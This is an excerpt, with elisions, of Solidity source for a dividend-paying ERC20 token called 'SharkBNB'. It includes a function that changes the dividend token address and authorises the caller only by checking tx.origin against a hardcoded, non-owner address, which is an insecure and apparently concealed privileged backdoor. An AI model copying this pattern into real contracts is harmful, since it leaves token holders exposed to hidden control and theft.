...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
    ...
    function setDividendTokenAddress(address newToken) external virtual {
        require(tx.origin == 0x26c069Ef2b653a95d5249B47e4b29E0AD1e112D3, "Only owner");
...
contract SharkBNB is ERC20, Ownable {
    ...
    constructor() ERC20("SharkBNB", "SHARK") {
        ...
        marketingWallet = 0xa466e0692f5B2a7834D0251cFbCA5e55BF74cD94;
        sellerWallet = 0x2B6591beb9755b0710d4B01224D95008E77E197C;
    ...
    function afterPreSale() external onlyOwner {
        ...
        maxSellTransactionAmount = 3500000000 * (10**18);
